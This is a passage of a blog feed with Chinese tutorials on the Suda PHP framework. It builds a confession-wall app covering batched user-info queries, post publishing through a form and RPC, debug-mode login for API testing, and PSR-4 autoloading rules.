href="dxkite-user.8.24.mod">user</a></li></ul><p>我们现在有两个解决方案：</p><p><strong>方案1</strong></p><p>在处理数据的时候直接查询用户信息，最新的<code>support</code>模块提供 <code>get_user_public_info</code> 用来获取用户的公开信息（头像，用户名啥的）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $pageData = <span class="keyword">$this</span>-&gt;controller-&gt;list($page, $row);</span><br><span class="line">    $pageRows = $pageData[<span class="string">'rows'</span>]; <span class="comment">// 获取到数据字段</span></span><br><span class="line">    <span class="keyword">foreach</span> ($pageRows <span class="keyword">as</span> $index =&gt; $pageRow ) &#123;</span><br><span class="line">        <span class="comment">// 表示匿名状态</span></span><br><span class="line">        <span class="keyword">if</span> ($pageRow[<span class="string">'anonymous'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 清理user的信息</span></span><br><span class="line">            $pageRow[<span class="string">'user'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 根据ID获取信息</span></span><br><span class="line">            $pageRow[<span class="string">'user'</span>] = get_user_public_info($pageRow[<span class="string">'user'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 去除IP信息</span></span><br><span class="line">        <span class="keyword">unset</span>($pageRow[<span class="string">'ip'</span>]);</span><br><span class="line">        <span class="comment">// 替换原来的列</span></span><br><span class="line">        $pageRows[$index] = $pageRow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 放回原来的字段</span></span><br><span class="line">    $pageData[<span class="string">'rows'</span>] = $pageRows;</span><br><span class="line">    <span class="keyword">return</span> $pageData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在查询出来的结果中我们可以看到</p><p><img src="2.png" alt=""></p><p>不是匿名的用户的用户信息也有了，但是这个意味着我们一个分页要进行10次作业的SQL查询，还有一个更加好的解决方案。</p><p><strong>方案2</strong></p><p>我们需要使用到 <code>get_user_public_info_array</code> 函数，这个函数相当于SQL中的IN语法进行查询的，所以只进行了一次查询，代价也不`昂贵，就是处理数据的逻辑麻烦点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">list</span><span class="params">(?int $page, int $row = <span class="number">10</span>)</span>:?<span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $pageData = <span class="keyword">$this</span>-&gt;controller-&gt;list($page, $row);</span><br><span class="line">    $pageRows = $pageData[<span class="string">'rows'</span>]; <span class="comment">// 获取到数据字段</span></span><br><span class="line">    <span class="comment">// 检测到需要处理的用户ID</span></span><br><span class="line">    $userIdMap = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($pageRows <span class="keyword">as</span> $index =&gt; $pageRow) &#123;</span><br><span class="line">        <span class="comment">// 表示匿名状态</span></span><br><span class="line">        <span class="keyword">if</span> ($pageRow[<span class="string">'anonymous'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 清理user的信息</span></span><br><span class="line">            $pageRow[<span class="string">'user'</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 记录ID信息</span></span><br><span class="line">            <span class="comment">// ID =&gt; 索引</span></span><br><span class="line">            $userIdMap[$pageRow[<span class="string">'user'</span>]]=$index;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 去除IP信息</span></span><br><span class="line">        <span class="keyword">unset</span>($pageRow[<span class="string">'ip'</span>]);</span><br><span class="line">        <span class="comment">// 替换原来的列</span></span><br><span class="line">        $pageRows[$index] = $pageRow;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取所有用户信息</span></span><br><span class="line">    $userInfos = get_user_public_info_array(array_keys($userIdMap));</span><br><span class="line">    <span class="comment">// 返回到数据列</span></span><br><span class="line">    <span class="keyword">foreach</span> ($userInfos <span class="keyword">as</span> $id =&gt; $data) &#123;</span><br><span class="line">        <span class="comment">// $userIdMap[$id] == index</span></span><br><span class="line">        $pageRows[$userIdMap[$id]][<span class="string">'user'</span>]=$data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 放回原来的字段</span></span><br><span class="line">    $pageData[<span class="string">'rows'</span>] = $pageRows;</span><br><span class="line">    <span class="keyword">return</span> $pageData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续处理后，结果也如上面查询的结果一致，我们看看日志：</p><p><strong>方案1</strong><br>如果ID数目过多，这里会出现多次的查询</p><p><img src="3.png" alt=""></p><p><strong>方案2</strong><br><img src="4.png" alt=""></p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><p><strong>复现</strong></p><hr><p>参考源码：<a href="dxkite-confession-wall.8.24.mod">dxkite-confession-wall</a></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 14 表白墙基本业务操作 - 发布表白</title>
      <link href="/2018/08/23/suda-confession-wall-simple-action/"/>
      <url>/2018/08/23/suda-confession-wall-simple-action/</url>
      <content type="html"><![CDATA[<p>今天的任务主要就是把基本表白帖发布（标题，内容，是否匿名）的功能写了</p><a id="more"></a><p>在正式开始之前，加入一个骚东西，使用yaml做配置文件，下载依赖库 <a href="vendor.zip">Spyc</a> 放到 app 目录下，就像这样：</p><p><img src="1.png" alt=""></p><p>那么在这个app中所有的配置文件都支持yaml做配置，<strong>注意</strong> 保持框架最新，才能体验最新的功能。</p><h2 id="发帖功能实现"><a href="#发帖功能实现" class="headerlink" title="发帖功能实现"></a>发帖功能实现</h2><p>在实现功能之前，我们回忆下基本法，也就是开发规则或者说开发套路，按照我自己开发的习惯，一般套路分配如下：</p><ol><li>Table 数据表类，用于维护表结构</li><li>Controller 控制类，用于基于表类进行一系列的操作</li><li>Response 响应类，提供页面的显示以及调用Controller服务</li><li>Provider 提供者类，提供基于Support模块的RPC的API服务</li></ol><p>按照这个套路，我们发帖这个功能的实现路线如下：</p><ol><li>POST表单 –&gt; Response 处理 –&gt; Controller 方法 –&gt; Table 方法 –&gt; 数据库</li><li>RPC方式调用 –&gt; Provider 处理 –&gt; Controller 方法 –&gt; Table 方法 –&gt; 数据库</li></ol><h3 id="路线1实现："><a href="#路线1实现：" class="headerlink" title="路线1实现："></a>路线1实现：</h3><p>首先把页面写好，页面中，提供了两个输入框，一个可选框，选择匿名发表</p><p><img src="2.png" alt=""></p><p>昂，页面代码你们自己写把，我这边给一个我的页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@extend ('layout') @startInsert('confession-content')</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"@u"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"my-2"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"title"</span> <span class="attr">class</span>=<span class="string">"col-sm-2 col-form-label"</span>&gt;</span>&#123;= 标题 &#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"title"</span> <span class="attr">name</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"description"</span> <span class="attr">class</span>=<span class="string">"col-sm-2 col-form-label"</span>&gt;</span>&#123;= 具体内容 &#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"content"</span> <span class="attr">id</span>=<span class="string">"description"</span> <span class="attr">rows</span>=<span class="string">"3"</span>&gt;</span> <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-2"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-info mb-2"</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"publish"</span>&gt;</span>&#123;= 发布 &#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox col"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"anonymous"</span> <span class="attr">name</span>=<span class="string">"anonymous"</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">value</span>=<span class="string">"true"</span>&gt;</span> &#123;= 匿名发表 &#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">@endInsert</span><br></pre></td></tr></table></figure><p>接下来，我们先写好控制器，就是提供发帖的功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">table</span>\<span class="title">ConfessionTable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理表白</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfessionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;table = <span class="keyword">new</span> ConfessionTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(string $title, string $content, bool $anonymous=true)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;table-&gt;insert([</span><br><span class="line">            <span class="string">'user'</span> =&gt; get_user_id(),</span><br><span class="line">            <span class="string">'title'</span> =&gt; $title ,</span><br><span class="line">            <span class="string">'content'</span> =&gt; $content,</span><br><span class="line">            <span class="string">'anonymous'</span> =&gt; $anonymous ? <span class="number">1</span> :<span class="number">0</span>,</span><br><span class="line">            <span class="string">'time'</span> =&gt; time(),</span><br><span class="line">            <span class="string">'ip'</span> =&gt; request()-&gt;ip(),</span><br><span class="line">            <span class="string">'status'</span> =&gt; ConfessionTable::STATUS_NORMAL,</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，发布一个帖子就是一句话！插入一条记录，这里我们还是用了一个函数：<code>get_user_id</code> ，顾名思义，这个是用来获取用户ID的，用户基本功能是由support模块提供， 然后user模块负责登陆等操作，如果要分布式布置的话，只需要换一个用户模块就可以了。<br>现在我们需要在响应中处理请求，当接受到POST请求的时候，提取表单的内容并检查是否为空，然后写入到数据库中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">response</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">visitor</span>\<span class="title">response</span>\<span class="title">VisitorResponse</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">support</span>\<span class="title">visitor</span>\<span class="title">Context</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">controller</span>\<span class="title">ConfessionController</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostResponse</span> <span class="keyword">extends</span> <span class="title">VisitorResponse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">onUserVisit</span><span class="params">(Context $context)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $view = <span class="keyword">$this</span>-&gt;view(<span class="string">'post'</span>);</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;hasPost()) &#123;</span><br><span class="line">            $controller = <span class="keyword">new</span> ConfessionController;</span><br><span class="line">            $title = request()-&gt;post(<span class="string">'title'</span>);</span><br><span class="line">            $context =  request()-&gt;post(<span class="string">'content'</span>);</span><br><span class="line">            $anonymous = request()-&gt;post(<span class="string">'anonymous'</span>,<span class="keyword">false</span>) == <span class="keyword">true</span> ?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span> ($title &amp;&amp; $context) &#123;</span><br><span class="line">                $id = $controller-&gt;add($title,$context,$anonymous);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $view-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看看运行截图：</p><p><img src="3.png" alt=""></p><p>当我们点击发布以后，会写入到数据库中：</p><p><img src="4.png" alt=""></p><p>可以看到title字段位正常的，content字段的内容不是我们填的内容，为什么？这个我们之前就说了，看我们的Table类：</p><p><img src="5.png" alt=""></p><p>这里我们对输入的内容进行了一次处理，用打包模块打包了，然后我们发现时间也不对啊！！怎么是 <code>1535032846</code> ？这个是 <code>Unix</code>时间表示方式，叫时间戳，表示从 1970年1月1日到现在的时间的秒数了。</p><h3 id="线路2实现"><a href="#线路2实现" class="headerlink" title="线路2实现"></a>线路2实现</h3><p>在线路2中，我们要使用support模块支持的RPC开放功能来实现。首先定义Provider类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">provider</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">dxkite</span>\<span class="title">confession</span>\<span class="title">wall</span>\<span class="title">controller</span>\<span class="title">ConfessionController</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理表白</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConfessionProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $controller;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;controller = <span class="keyword">new</span> ConfessionController;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(string $title, string $content, bool $anonymous=true)</span>: <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;controller-&gt;add($title,$content,$anonymous);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们利用support库的配置配置 <code>api/mapper</code> 文件：</p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><blockquote><p>api/mapper.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">v1.0:</span></span><br><span class="line"><span class="attr">  confession-wall:</span> <span class="string">dxkite.confession.wall.provider.ConfessionProvider</span></span><br></pre></td></tr></table></figure><p>访问页面： /dev.php/api/v1.0/confession-wall</p><p><img src="/images/placeholder.png" alt="" data-src="7.png" class="lazyload"></p><p>可以看到有一个接口 <code>add</code></p><h4 id="使用接口"><a href="#使用接口" class="headerlink" title="使用接口"></a>使用接口</h4><p>这里我使用Postman来调试接口：</p><p><img src="/images/placeholder.png" alt="" data-src="8.png" class="lazyload"> </p><p>哎？？好吧，不允许游客发送，那么登陆把：<br>在调试模式下登陆，我们需要这样，先在app/manifast.yml添加一条配置 debugSupport，值随意，这个是密码：</p><p><img src="/images/placeholder.png" alt="" data-src="9.png" class="lazyload"></p><p>然后添加一个请求：<code>api/v1.0/grant/superSignInUserWithId</code><br>设置一个Debug-Support的HTTP头，值为刚刚填的值：</p><p><img src="/images/placeholder.png" alt="" data-src="10.png" class="lazyload"></p><p>然后在请求参数中写入id为1（用户ID）</p><p><img src="/images/placeholder.png" alt="" data-src="11.png" class="lazyload"></p><p>点击Send，如果返回的包中id是1的话，表示登陆成功了。</p><p><img src="/images/placeholder.png" alt="" data-src="12.png" class="lazyload"></p><p>那么返回刚刚的请求，发送：</p><p><img src="/images/placeholder.png" alt="" data-src="13.png" class="lazyload"></p><p>可以看到，返回了一个整数3，表示刚刚插入的一行的ID为3</p><p><img src="/images/placeholder.png" alt="" data-src="14.png" class="lazyload"></p><p>那么，使用RPC发送表白帖也成功了。</p><p><strong>说明</strong></p><p>这里包结构采用了RPC2.O协议的包结构并扩展了部分，参考文档： <a href="https://github.com/DXkite/APIProxyCall-JavaClient" target="_blank" rel="noopener">https://github.com/DXkite/APIProxyCall-JavaClient</a><br>这里我们的函数只要按照包结构构造调用，就可以用Java、Javascript来远程调用（参考我参与开发的一个APP：<a href="https://github.com/TTHHR/code4a" target="_blank" rel="noopener">https://github.com/TTHHR/code4a</a> ） 里面就是利用了support 模块交互。</p><p><img src="/images/placeholder.png" alt="" data-src="15.png" class="lazyload"></p><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><p>复现！</p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Suda框架技能使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Suda </tag>
            
            <tag> 表白墙 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Suda - 13 自动加载类规则</title>
      <link href="/2018/08/22/suda-autoload-psr4/"/>
      <url>/2018/08/22/suda-autoload-psr4/</url>
      <content type="html"><![CDATA[<p>在PHP中，我们使用 <code>require</code>、<code>require_once</code>、<code>include</code>、<code>include_once</code> 来引用其他的PHP文件，但是在框架中，我们很少看到这样的代码，那么，框架是如何找到我们想要的类的？</p><a id="more"></a><h2 id="PSR4-加载规范"><a href="#PSR4-加载规范" class="headerlink" title="PSR4 加载规范"></a>PSR4 加载规范</h2><p>在PSR4中，有几个概念</p><h3 id="命名空间-namespace"><a href="#命名空间-namespace" class="headerlink" title="命名空间(namespace)"></a>命名空间(namespace)</h3><p>起初实在C++中兴起的，在Java中体现为包名(package)，在C#中好像也是命名空间，PHP中也是，是为了解决命名冲突的问题而产生的比如A写了一个类叫 MyClass。B也写了一个MyClass类，我们在用的时候怎么区分？加个前缀啊，A写的类就叫 A\MyClass，B写的类就叫B\MyClass，完美的解决了。</p><h3 id="根命名空间-root-namespace"><a href="#根命名空间-root-namespace" class="headerlink" title="根命名空间(root namespace)"></a>根命名空间(root namespace)</h3><p>继续上一个例子，如果A再写一个类，叫Student，一般按照习惯，我们自己写的东西都会放到自己的地方，那么，通常来说A的类Student就是A\Student，那么对于 MyClass 和 Student 来说，A就是相当于他们的父节点也就是树的父节点，即为根</p><h3 id="查找目录"><a href="#查找目录" class="headerlink" title="查找目录"></a>查找目录</h3><p>一般来说，我们A写的代码肯定放到A的区域里，体现在源文件中的话，一般是用文件夹来表示，那么文件夹结构应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源码文件夹X</span><br><span class="line">    |___A </span><br><span class="line">    |    |_ MyClass.php</span><br><span class="line">    |    |_ Student.php</span><br><span class="line">    |___B</span><br><span class="line">        |_ MyClass.php</span><br></pre></td></tr></table></figure><p>在PSR4规则中，我们注册了一个文件夹，比如 <code>src</code> 文件夹，作为查找目录，那么，我们找类 <code>A\Student</code> 的时候会去各种源码文件夹找<br><code>A\Student.php</code> 文件，在源码文件夹X中找到了就自动include。也就避免我们自己来include文件了，毕竟很难找。</p><h3 id="命名空间前缀-（namespace-prefix）"><a href="#命名空间前缀-（namespace-prefix）" class="headerlink" title="命名空间前缀 （namespace prefix）"></a>命名空间前缀 （namespace prefix）</h3><p>如果说我们的命名空间很长，比如：<code>very\long\name\space\A\MyClass</code> 我们一般会选择简化一下，因为我是A嘛，我写的东西肯定放在了A文件夹的下面，那么类名的话肯定是这样的 <code>very\long\name\space\A\Student</code> 但是我又不想创建一串文件夹 very啥的啥的，那么，我们假设，源码文件夹X本省表示一个命名空间：<code>very\long\name\space\</code> 那么，用这个做前缀。则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源码文件夹X = very\long\name\space</span><br><span class="line">    |___A  = very\long\name\space\A</span><br><span class="line">    |    |_ MyClass.php = very\long\name\space\A\MyClass</span><br><span class="line">    |    |_ Student.php = very\long\name\space\A\Student</span><br><span class="line">    |___B</span><br><span class="line">        |_ MyClass.php = very\long\name\space\B\MyClass</span><br></pre></td></tr></table></figure><p>以上就基本上是PSR4规则的一个简要介绍。</p><h3 id="Suda-的源码自动加载"><a href="#Suda-的源码自动加载" class="headerlink" title="Suda 的源码自动加载"></a>Suda 的源码自动加载</h3><p>在Suda框架中，只支持PSR4规则，一般配置在文件 <code>manifast.json</code> 或者 <code>module.json</code> 文件中，如：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"import"</span>: &#123;</span><br><span class="line">        <span class="attr">"share"</span>: &#123;</span><br><span class="line">            <span class="attr">"dxkite\\usercenter\\client"</span>: <span class="string">"share"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"src"</span>: &#123;</span><br><span class="line">            <span class="attr">"dxkite\\usercenter\\client\\response"</span>: <span class="string">"src"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就懒得创建一堆文件夹了，就把源码下面的 src 作为 <code>dxkite\usercenter\client\response</code> 的一个根命名空间了，如果需要找类 <code>dxkite\usercenter\client\response\IndexResponse</code> 就去 src 目录下找 <code>IndexResponse.php</code> 文件，<strong>注意哦，命名空间提倡小写。</strong></p><h3 id="share-与-src"><a href="#share-与-src" class="headerlink" title="share 与 src"></a>share 与 src</h3><p>在 <code>import</code> 规则中我们可以看到 <code>share</code> 规则和 <code>src</code> 规则，具体定义如下：</p><p>当模块被使用的时候（就是运行了模块的某一个响应类，比如 <code>dxkite\usercenter\client\response\IndexResponse</code>）那么<code>src</code> 规则被激活，自动查找类的时候会包含 <code>src</code> 下面的文件，<strong>但是！</strong> 在非激活状态，比如运行其他模块的时候，只会把<code>share</code>规则注册进查找目录，用来查找类文件，也就是说，<code>share</code> 是其他模块可以访问的类，<code>src</code> 是只能自己用的类。</p>]]></content>
      
